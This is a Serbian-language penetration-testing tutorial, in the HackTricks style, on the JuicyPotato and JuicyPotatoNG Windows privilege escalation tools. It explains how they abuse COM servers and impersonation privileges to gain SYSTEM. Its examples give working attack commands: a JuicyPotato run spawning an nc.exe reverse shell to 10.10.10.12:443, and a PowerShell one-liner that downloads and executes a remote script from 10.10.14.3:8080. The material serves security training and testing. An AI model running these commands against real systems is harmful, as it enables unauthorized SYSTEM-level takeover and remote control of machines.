# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato je zastareo. Obično radi na Windows verzijama do Windows 10 1803 / Windows Server 2016. Microsoft-ove promene uvedene počevši od Windows 10 1809 / Server 2019 pokvarile su originalnu tehniku. Za te buildove i novije, razmotrite moderne alternative kao što su PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato i druge. Pogledajte stranicu ispod za ažurirane opcije i upotrebu.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (zloupotreba zlatnih privilegija) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Uslatka verzija_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, sa malo 'soka', tj. **još jedan alat za Local Privilege Escalation, od Windows Service Accounts do NT AUTHORITY\SYSTEM**_

#### Možete preuzeti juicypotato sa [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Kratke napomene o kompatibilnosti

- Radi pouzdano do Windows 10 1803 i Windows Server 2016 kada trenutni kontekst ima SeImpersonatePrivilege ili SeAssignPrimaryTokenPrivilege.
- Prekinuto zbog Microsoft-ovog hardeninga u Windows 10 1809 / Windows Server 2019 i novijim. Za te buildove koristite alternativе navedene gore.

### Sažetak <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i njegove [variants](https://github.com/decoder-it/lonelypotato) koriste lanac eskalacije privilegija zasnovan na `BITS` [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) koji ima MiTM listener na `127.0.0.1:6666` i kada imate `SeImpersonate` ili `SeAssignPrimaryToken` privilegije. Tokom pregleda Windows build-a otkrili smo podešavanje gde je `BITS` namerno onemogućen i port `6666` je bio zauzet.

Odlučili smo da weaponizujemo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **upoznajte Juicy Potato**.

> Za teoriju, pogledajte [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i pratite lanac linkova i referenci.

Otkrili smo da, pored `BITS`, postoji nekoliko COM servera koje možemo zloupotrebiti. Oni samo treba da:

1. budu instancirani od strane trenutnog korisnika, obično "service user" koji ima impersonation privilegije
2. implementiraju `IMarshal` interfejs
3. pokreću se kao elevirani korisnik (SYSTEM, Administrator, …)

Nakon testiranja dobili smo i isprobali opsežnu listu interesantnih CLSID-ova na više Windows verzija.

### Sočni detalji <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vam omogućava:

- **Target CLSID** _izaberite bilo koji CLSID koji želite._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _možete naći listu organizovanu po OS-u._
- **COM Listening port** _definišite COM listening port koji preferirate (umesto marshalled hardcoded 6666)_
- **COM Listening IP address** _povežite server na bilo koji IP_
- **Process creation mode** _u zavisnosti od privilegija impostiranog korisnika možete izabrati između:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _pokrenite izvršni fajl ili skriptu ako eksploatacija uspe_
- **Process Argument** _prilagodite argumente pokrenutog procesa_
- **RPC Server address** _za prikriven pristup možete se autentifikovati na eksterni RPC server_
- **RPC Server port** _korisno ako se želite autentifikovati na eksterni server i firewall blokira port `135`…_
- **TEST mode** _uglavnom za testiranje, npr. testiranje CLSID-ova. Kreira DCOM i ispisuje korisnika tokena. Pogledajte_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Korišćenje <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Završne misli <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ako korisnik ima privilegije `SeImpersonate` ili `SeAssignPrimaryToken` onda ste **SYSTEM**.

Gotovo je nemoguće sprečiti zloupotrebu svih ovih COM Servers. Možete razmotriti izmenu permisija ovih objekata preko `DCOMCNFG`, ali srećno — biće to izazovno.

Pravo rešenje je zaštititi osetljive naloge i aplikacije koje rade pod `* SERVICE` nalozima. Zaustavljanje `DCOM` bi svakako omelo ovaj exploit ali bi moglo imati ozbiljan uticaj na osnovni OS.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG ponovo uvodi JuicyPotato-style lokalnu eskalaciju privilegija na modernim Windows sistemima kombinujući:
- DCOM OXID resolution do lokalnog RPC servera na izabranom portu, izbegavajući stari hardkodovani 127.0.0.1:6666 listener.
- SSPI hook za hvatanje i impersonaciju dolazne SYSTEM autentikacije bez potrebe za RpcImpersonateClient, što takođe omogućava CreateProcessAsUser kada je prisutna samo SeAssignPrimaryTokenPrivilege.
- Trikovi da se zadovolje DCOM ograničenja aktivacije (npr. raniji zahtev INTERACTIVE-group kada se ciljaju PrintNotify / ActiveX Installer Service klase).

Važne napomene (ponašanje se menja kroz build-ove):
- September 2022: Početna tehnika je radila na podržanim Windows 10/11 i Server ciljevima koristeći “INTERACTIVE trick”.
- January 2023 ažuriranje od autora: Microsoft je kasnije blokirao INTERACTIVE trick. Drugi CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) vraća mogućnost exploita ali samo na Windows 11 / Server 2022 prema njihovom postu.

Osnovna upotreba (više opcija u help-u):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Ako ciljate Windows 10 1809 / Server 2019 gde je classic JuicyPotato zakrpljen, preferirajte alternative linkovane na vrhu (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, itd.). NG može biti situacioni u zavisnosti od build-a i stanja servisa.

## Primeri

Napomena: Posetite [this page](https://ohpe.it/juicy-potato/CLSID/) za listu CLSID-ova koje možete probati.

### Dobijte nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Pokrenite novi CMD (ako imate RDP pristup)

![](<../../images/image (300).png>)

## Problemi sa CLSID-om

Često podrazumevani CLSID koji JuicyPotato koristi **ne radi** i exploit ne uspeva. Obično je potrebno više pokušaja da se pronađe **funkcionalni CLSID**. Da biste dobili listu CLSID-ova koje treba pokušati za određeni operativni sistem, posetite ovu stranicu:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Provera CLSID-ova**

Prvo će vam trebati neki izvršni fajlovi pored juicypotato.exe.

Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i učitajte ga u vašu PS sesiju, i download-ujte i izvršite [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Taj skript će napraviti listu mogućih CLSID-ova za testiranje.

Zatim download-ujte [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (promenite putanju do liste CLSID-ova i do juicypotato izvršnog fajla) i izvršite ga. Počeće da isprobava svaki CLSID, i **kada se broj porta promeni, to znači da je CLSID radio**.

**Proverite** funkcionalne CLSID-ove **koristeći parametar -c**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
